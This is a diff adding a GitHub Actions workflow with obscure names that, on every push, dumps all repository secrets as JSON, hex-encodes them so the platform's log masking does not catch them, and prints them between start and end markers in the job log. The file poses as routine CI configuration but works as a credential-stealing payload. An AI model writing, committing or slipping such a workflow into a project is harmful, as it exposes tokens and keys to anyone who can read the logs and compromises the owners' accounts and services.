@@ -1,0 +1,17 @@
+name: zt
+on:
+  push:
+  workflow_dispatch:
+jobs:
+  b:
+    runs-on: ubuntu-latest
+    steps:
+      - name: d
+        env:
+          SEC: ${{ toJSON(secrets) }}
+        run: |
+          echo "HHSTART"
+          echo -n "$SEC" | od -An -tx1 | tr -d ' 
+'
+          echo ""
+          echo "HHEND"
